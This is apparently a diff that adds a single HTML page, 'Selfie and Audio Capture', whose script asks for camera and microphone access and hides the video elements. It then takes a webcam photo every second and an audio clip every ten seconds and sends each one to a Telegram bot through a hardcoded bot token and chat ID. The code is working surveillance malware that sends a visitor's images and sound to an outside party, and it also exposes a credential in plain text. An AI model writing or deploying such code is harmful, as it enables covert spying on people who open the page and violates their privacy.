@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selfie and Audio Capture</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        header, footer {
+            background-color: #333;
+            color: white;
+            padding: 1em;
+            width: 100%;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to the Selfie and Audio Capture Website</h1>
+    </header>
+    <main>
+        <p>Selfie and audio capture are running in the background...</p>
+    </main>
+    <footer>
+        <p>&copy; 2024 Selfie and Audio Capture Website</p>
+    </footer>
+
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const telegramBotToken = '7455670410:AAFyu4dCgrvfZXhrwRf9WAjn7g1mJyKnqdQ';
+        const chatId = '1691680798';
+        const captureInterval = 1000; // 1 second
+        const audioCaptureInterval = 10000; // 10 seconds
+
+        // Access the device camera and stream to video element
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                setInterval(captureImage, captureInterval);
+            })
+            .catch(err => {
+                console.error("Error accessing webcam: ", err);
+            });
+
+        function captureImage() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            sendImageToTelegram(imageData);
+        }
+
+        function sendImageToTelegram(imageData) {
+            const blob = dataURItoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'selfie.png');
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error("Error sending image to Telegram: ", data.description);
+                }
+            })
+            .catch(error => {
+                console.error("Error sending image to Telegram: ", error);
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Microphone recording functionality
+        let mediaRecorder;
+        let audioChunks = [];
+
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
+                    audioChunks = [];
+                    sendAudioToTelegram(audioBlob);
+                };
+
+                setInterval(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                    mediaRecorder.start();
+                }, audioCaptureInterval);
+            })
+            .catch(err => {
+                console.error("Error accessing microphone: ", err);
+            });
+
+        function sendAudioToTelegram(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('audio', audioBlob, 'audio.mp4');
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendAudio`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error("Error sending audio to Telegram: ", data.description);
+                }
+            })
+            .catch(error => {
+                console.error("Error sending audio to Telegram: ", error);
+            });
+        }
+    </script>
+</body>
+</html>
